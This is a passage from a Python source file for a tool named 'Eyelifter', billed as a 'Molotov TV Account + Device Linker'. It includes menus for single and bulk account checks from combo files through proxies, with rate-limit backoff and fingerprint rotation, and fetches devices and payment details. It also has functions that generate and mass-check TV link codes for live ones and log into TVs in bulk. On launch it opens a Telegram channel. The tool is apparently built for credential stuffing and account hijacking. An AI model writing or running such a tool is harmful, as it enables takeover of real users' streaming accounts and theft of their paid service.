        fh.close()
    except Exception:
        pass

    old = os.path.join(folder, "codes.txt")
    new = os.path.join(folder, f"codes_{made}.txt")
    if os.path.exists(old):
        try:
            os.rename(old, new)
        except Exception:
            pass

    Eyelifter_log("💾", "INFO", "SAVE", f"{made} codes → {new}")
    Eyelifter_divider()
    Eyelifter_summary([
        ("Generated", made),
        ("Failed", fails),
        ("Rate Limited", rl),
        ("Folder", folder),
    ])
    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_check_single():
    Eyelifter_verify("check_single")
    Eyelifter_section("CHECK ONE CODE")
    code = input(f"{Eyelifter_color('96', '[*] Code (4 chars): ')}").strip().upper()
    if not CODE_RE.match(code):
        Eyelifter_log("❌", "ERROR", "INPUT", "invalid format")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    start = time.time()
    http, body = Eyelifter_code_status_sync(code)
    elapsed = time.time() - start

    Eyelifter_dump_raw(f"check response  HTTP {http}", body, 40)
    print()

    status = "unknown"
    try:
        j = json.loads(body)
        status = (j.get("status") or "unknown").lower()
    except Exception:
        pass

    if status == "waiting":
        verdict = "WAITING (live, ready to link)"
        color = "32"
    elif status == "ok":
        verdict = "LINKED (already used)"
        color = "36"
    elif status == "expired":
        verdict = "EXPIRED"
        color = "33"
    elif http == 404:
        verdict = "NOT FOUND (404)"
        color = "31"
    elif http == 400:
        verdict = "INVALID CODE (400)"
        color = "31"
    elif http == 429:
        verdict = "RATE LIMITED"
        color = "33"
    else:
        verdict = status.upper()
        color = "31"

    print(Eyelifter_color(color, f"  {verdict}", True))

    Eyelifter_summary([
        ("Code", code),
        ("Status", status.upper()),
        ("HTTP", str(http)),
        ("Time", f"{elapsed:.2f}s"),
        ("Checked By", AUTHOR_TAG),
    ])
    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_check_bulk():
    Eyelifter_verify("check_bulk")
    Eyelifter_section("BULK CHECK CODES")
    path = input(f"{Eyelifter_color('96', '[*] Codes file: ')}").strip()
    if not path or not os.path.isfile(path):
        Eyelifter_log("❌", "ERROR", "FILE", "not found")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        content = f.read()

    codes = set()
    for raw in content.splitlines():
        line = raw.strip().upper()
        if not line or line.startswith("#"):
            continue
        m = CODE_ANY_RE.search(line)
        if m:
            codes.add(m.group(1))
    codes = sorted(codes)

    if not codes:
        Eyelifter_log("❌", "ERROR", "EXTRACT", "no codes")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    Eyelifter_log("✅", "INFO", "EXTRACT", f"{len(codes)} codes")

    os.makedirs(RESULTS_FOLDER, exist_ok=True)
    ts = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
    rand_tag = "".join(random.choices(string.ascii_lowercase + string.digits, k=4))
    folder = os.path.join(RESULTS_FOLDER, f"Check_{ts}_{rand_tag}")
    os.makedirs(folder, exist_ok=True)

    waiting_f = open(os.path.join(folder, "waiting.txt"), "w", encoding="utf-8")
    linked_f  = open(os.path.join(folder, "linked.txt"),  "w", encoding="utf-8")
    expired_f = open(os.path.join(folder, "expired.txt"), "w", encoding="utf-8")
    invalid_f = open(os.path.join(folder, "invalid.txt"), "w", encoding="utf-8")
    error_f   = open(os.path.join(folder, "errors.txt"),  "w", encoding="utf-8")

    header = (f"# Molotov TV code check - {datetime.now().isoformat()}\n"
              f"# Checked by {AUTHOR_TAG}\n# Seal: {CREDIT_SEAL}\n\n")
    for fh in (waiting_f, linked_f, expired_f, invalid_f, error_f):
        fh.write(header)

    pbar = None
    try:
        pbar = tqdm(total=len(codes), desc="checking", unit="code", ncols=80)
    except Exception:
        pbar = None

    stats = {"waiting": 0, "ok": 0, "expired": 0, "invalid": 0, "error": 0}

    for code in codes:
        http, body = Eyelifter_code_status_sync(code)

        status = "unknown"
        try:
            j = json.loads(body)
            status = (j.get("status") or "").lower()
        except Exception:
            pass

        if status == "waiting":
            stats["waiting"] += 1
            print(Eyelifter_color("32", f"  {code}  WAITING"))
            waiting_f.write(f"{code} | WAITING | HTTP={http}\n")
        elif status == "ok":
            stats["ok"] += 1
            print(Eyelifter_color("36", f"  {code}  LINKED"))
            linked_f.write(f"{code} | LINKED | HTTP={http}\n")
        elif status == "expired":
            stats["expired"] += 1
            print(Eyelifter_color("33", f"  {code}  EXPIRED"))
            expired_f.write(f"{code} | EXPIRED | HTTP={http}\n")
        elif http in (400, 404):
            stats["invalid"] += 1
            print(Eyelifter_color("31", f"  {code}  INVALID ({http})"))
            invalid_f.write(f"{code} | HTTP={http}\n")
        else:
            stats["error"] += 1
            print(Eyelifter_color("33", f"  {code}  ERROR ({http})"))
            error_f.write(f"{code} | HTTP={http} | {body[:100]}\n")

        for fh in (waiting_f, linked_f, expired_f, invalid_f, error_f):
            fh.flush()

        if pbar:
            pbar.update(1)
        time.sleep(CONFIG.get("code_check_delay", 0.3))

    if pbar:
        pbar.close()

    for fh in (waiting_f, linked_f, expired_f, invalid_f, error_f):
        try:
            fh.close()
        except Exception:
            pass

    for base, key in (
        ("waiting.txt", "waiting"),
        ("linked.txt",  "ok"),
        ("expired.txt", "expired"),
        ("invalid.txt", "invalid"),
        ("errors.txt",  "error"),
    ):
        old = os.path.join(folder, base)
        new = os.path.join(folder, base.replace(".txt", f"_{stats[key]}.txt"))
        if os.path.exists(old):
            try:
                os.rename(old, new)
            except Exception:
                pass

    Eyelifter_log("💾", "INFO", "SAVE", f"results → {folder}")
    Eyelifter_divider()
    Eyelifter_summary([
        ("Total", len(codes)),
        ("Waiting (live)", stats["waiting"]),
        ("Linked", stats["ok"]),
        ("Expired", stats["expired"]),
        ("Invalid", stats["invalid"]),
        ("Errors", stats["error"]),
        ("Folder", folder),
    ])
    input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_code_tools(proxies):
    Eyelifter_verify("code_tools")
    while True:
        Eyelifter_section("CODE TOOLS")
        print(f"  [1] Generate single code")
        print(f"  [2] Bulk generate codes")
        print(f"  [3] Check single code")
        print(f"  [4] Bulk check codes from file")
        print(f"  [5] TV login (link code)")
        print(f"  [6] Bulk TV login from file")
        print(f"  [7] Back to main menu")

        ch = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()
        if ch == "1":
            Eyelifter_gen_single()
        elif ch == "2":
            Eyelifter_gen_bulk()
        elif ch == "3":
            Eyelifter_check_single()
        elif ch == "4":
            Eyelifter_check_bulk()
        elif ch == "5":
            Eyelifter_tv_login(proxies)
        elif ch == "6":
            Eyelifter_bulk_tv_login(proxies)
        elif ch == "7":
            return
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


def Eyelifter_settings_menu():
    Eyelifter_verify("settings")
    global DEBUG, REQ_TIMEOUT, RATE_LIMIT_BACKOFF, MAX_RATE_LIMIT_RETRIES
    Eyelifter_section("SETTINGS")
    print(Eyelifter_color("96", "Current:"))
    print(f"  [1]  Threads:            {CONFIG['threads']}")
    print(f"  [2]  Timeout:            {CONFIG['timeout']}s")
    print(f"  [3]  Retries:            {CONFIG['retries']}")
    print(f"  [4]  Retry Delay:        {CONFIG['retry_delay']}s")
    print(f"  [5]  Combo Delay:        {CONFIG['combo_delay']}s")
    print(f"  [6]  Rate Limit Backoff: {CONFIG['rate_limit_backoff']}s")
    print(f"  [7]  Max RL Retries:     {CONFIG['max_rate_limit_retries']}")
    print(f"  [8]  Proxy File:         {CONFIG['proxies_file']}")
    print(f"  [9]  Skip Proxy Test:    {CONFIG['skip_proxy_test']}")
    print(f"  [10] Fetch Devices:      {CONFIG['fetch_devices']}")
    print(f"  [11] Fetch Payments:     {CONFIG['fetch_payments']}")
    print(f"  [12] Code Gen Delay:     {CONFIG['code_gen_delay']}s")
    print(f"  [13] Code Check Delay:   {CONFIG['code_check_delay']}s")
    print(f"  [14] Bulk TV Delay:      {CONFIG['bulk_tv_delay']}s")
    print(f"  [15] Rotate Fingerprint: {CONFIG['rotate_fingerprint']}")
    print(f"  [16] Debug:              {CONFIG['debug']}")
    print(f"  [17] Back")

    ch = input(f"{Eyelifter_color('96', '[*] Select: ')}").strip()
    changed = False
    try:
        if ch == "1":
            CONFIG["threads"] = max(1, min(100, int(input("Threads (1-100): "))))
            _loader.settings["threads"] = CONFIG["threads"]; changed = True
        elif ch == "2":
            CONFIG["timeout"] = max(5, min(300, int(input("Timeout (5-300): "))))
            _loader.settings["timeout"] = CONFIG["timeout"]
            REQ_TIMEOUT = CONFIG["timeout"]; changed = True
        elif ch == "3":
            CONFIG["retries"] = max(0, min(10, int(input("Retries (0-10): "))))
            _loader.settings["retries"] = CONFIG["retries"]; changed = True
        elif ch == "4":
            CONFIG["retry_delay"] = max(0.0, min(60.0, float(input("Retry delay (s): "))))
            _loader.settings["retry_delay"] = CONFIG["retry_delay"]; changed = True
        elif ch == "5":
            CONFIG["combo_delay"] = max(0.0, min(60.0, float(input("Combo delay (s): "))))
            _loader.settings["combo_delay"] = CONFIG["combo_delay"]; changed = True
        elif ch == "6":
            CONFIG["rate_limit_backoff"] = max(1, min(600, int(input("Backoff (1-600): "))))
            _loader.settings["rate_limit_backoff"] = CONFIG["rate_limit_backoff"]
            RATE_LIMIT_BACKOFF = CONFIG["rate_limit_backoff"]; changed = True
        elif ch == "7":
            CONFIG["max_rate_limit_retries"] = max(0, min(20, int(input("Max RL retries (0-20): "))))
            _loader.settings["max_rate_limit_retries"] = CONFIG["max_rate_limit_retries"]
            MAX_RATE_LIMIT_RETRIES = CONFIG["max_rate_limit_retries"]; changed = True
        elif ch == "8":
            v = input("Proxies file path: ").strip()
            if v:
                CONFIG["proxies_file"] = v
                _loader.settings["proxies_file"] = v; changed = True
        elif ch == "9":
            CONFIG["skip_proxy_test"] = not CONFIG["skip_proxy_test"]
            _loader.settings["skip_proxy_test"] = CONFIG["skip_proxy_test"]; changed = True
        elif ch == "10":
            CONFIG["fetch_devices"] = not CONFIG["fetch_devices"]
            _loader.settings["fetch_devices"] = CONFIG["fetch_devices"]; changed = True
        elif ch == "11":
            CONFIG["fetch_payments"] = not CONFIG["fetch_payments"]
            _loader.settings["fetch_payments"] = CONFIG["fetch_payments"]; changed = True
        elif ch == "12":
            CONFIG["code_gen_delay"] = max(0.0, min(60.0, float(input("Code gen delay (s): "))))
            _loader.settings["code_gen_delay"] = CONFIG["code_gen_delay"]; changed = True
        elif ch == "13":
            CONFIG["code_check_delay"] = max(0.0, min(60.0, float(input("Code check delay (s): "))))
            _loader.settings["code_check_delay"] = CONFIG["code_check_delay"]; changed = True
        elif ch == "14":
            CONFIG["bulk_tv_delay"] = max(0.0, min(60.0, float(input("Bulk TV delay (s): "))))
            _loader.settings["bulk_tv_delay"] = CONFIG["bulk_tv_delay"]; changed = True
        elif ch == "15":
            CONFIG["rotate_fingerprint"] = not CONFIG["rotate_fingerprint"]
            _loader.settings["rotate_fingerprint"] = CONFIG["rotate_fingerprint"]; changed = True
        elif ch == "16":
            CONFIG["debug"] = not CONFIG["debug"]
            _loader.settings["debug"] = CONFIG["debug"]
            DEBUG = CONFIG["debug"]; changed = True
        elif ch == "17":
            return
    except (ValueError, TypeError):
        Eyelifter_log("❌", "ERROR", "CONFIG", "invalid")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")
        return

    if changed:
        try:
            _loader.Eyelifter_save()
            Eyelifter_log("💾", "INFO", "CONFIG", "saved")
        except Exception as e:
            Eyelifter_log("⚠️", "WARN", "CONFIG", f"save failed: {e}")
        input(f"{Eyelifter_color('93', '[*] Enter to continue...')}")


def Eyelifter_main():
    Eyelifter_verify("main")

    def _delayed_open():
        time.sleep(0.4)
        Eyelifter_open_url("https://t.me/darkhuchannel")

    threading.Thread(target=_delayed_open, daemon=True).start()
    Eyelifter_banner(TOOL_NAME, "Molotov TV Account + Device Linker")
    proxies = Eyelifter_load_proxies()

    while True:
        Eyelifter_verify("menu")
        Eyelifter_section("MAIN MENU")
        if proxies:
            Eyelifter_log("🌐", "INFO", "PROXY", f"{len(proxies)} proxies loaded")
        else:
            Eyelifter_log("⚠️", "WARN", "PROXY", "no proxies — direct connection")

        print("[1] Single account check")
        print("[2] Bulk account check from file")
        print("[3] Code tools")
        print("[4] Settings")
        print("[5] Exit")

        choice = input(f"{Eyelifter_color('93', '[*] Select: ')}").strip()

        if choice == "1":
            Eyelifter_single_check(proxies)
        elif choice == "2":
            _eyelifter_stop.clear()
            Eyelifter_bulk_check(proxies)
        elif choice == "3":
            Eyelifter_code_tools(proxies)
        elif choice == "4":
            Eyelifter_settings_menu()
            proxies = Eyelifter_load_proxies()
        elif choice == "5":
            print("Exiting...")
            break
        else:
            Eyelifter_log("❌", "ERROR", "INPUT", "invalid choice")


if __name__ == "__main__":
    while True:
        try:
            Eyelifter_main()
            break
        except SystemExit:
            raise
        except KeyboardInterrupt:
            print("\nExiting...")
            sys.exit(1)
        except Exception as e:
            print(f"[FATAL] {type(e).__name__}: {e}")
            print("restarting menu in 3s...")
            time.sleep(3)